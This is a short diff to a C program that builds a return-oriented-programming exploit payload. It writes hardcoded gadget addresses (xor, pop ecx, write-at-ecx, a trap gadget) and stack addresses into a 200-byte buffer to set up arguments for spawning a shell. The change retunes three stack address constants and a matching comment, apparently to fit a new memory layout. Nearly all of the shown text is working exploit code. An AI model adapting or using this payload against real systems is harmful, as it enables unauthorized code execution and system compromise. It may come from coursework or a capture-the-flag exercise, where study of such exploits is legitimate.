@@ -9,9 +9,9 @@ int main(void)
 {
   char bufr[200];
   // bufr address = bfbf57e5
-  char null_arg_addr[] = "\x94\x58\xbf\xbf";
-  char shell_addr[] = "\x98\x58\xbf\xbf";
-  char prev_addr[] = "\x8c\x58\xbf\xbf";
+  char null_arg_addr[] = "\x8c\x58\xbf\xbf";
+  char shell_addr[] = "\x9c\x58\xbf\xbf";
+  char prev_addr[] = "\x90\x58\xbf\xbf";
 
   char trap[] = "\xe5\xb6\xa9\xbb";
   char xor_eax[] = "\xc2\xb3\xa9\xbb";
@@ -42,7 +42,7 @@ int main(void)
   strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
   // pop null args address into ecx
   strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
-  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf5894
+  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf588c
   // write 4 bytes of null to address in ecx
   strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
                                              // null arg should be present
